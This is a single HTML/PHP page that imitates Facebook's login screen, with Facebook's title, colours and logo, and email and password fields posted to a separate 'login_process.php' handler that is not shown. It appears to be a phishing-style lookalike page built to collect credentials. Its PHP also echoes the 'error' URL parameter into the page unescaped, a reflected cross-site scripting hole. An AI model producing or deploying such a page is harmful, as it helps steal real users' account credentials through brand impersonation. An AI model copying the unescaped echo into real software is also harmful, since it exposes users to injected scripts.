<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 350px;
            text-align: center;
        }

        .login-container h2 {
            color: #1877F2;
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: bold;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }

        button {
            background-color: #1877F2;
            color: #fff;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
        }

        button:hover {
            background-color: #1461C2;
        }

        .error {
            color: red;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
            color: #666;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-link {
            margin-top: 20px;
            font-size: 14px;
            color: #1877F2;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Facebook</h2>
        <img src="images.jpg" alt="Facebook Logo" width="80" height="80" style="margin-bottom: 20px;">

        <?php
        if (isset($_GET['error'])) {
            echo "<p class='error'>" . $_GET['error'] . "</p>";
        }
        ?>

        <form action="login_process.php" method="post">
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>

        <a href="#" class="forgot-password">Forgotten password?</a>
        <p class="signup-link">Create New Account</p>

    </div>

</body>
</html>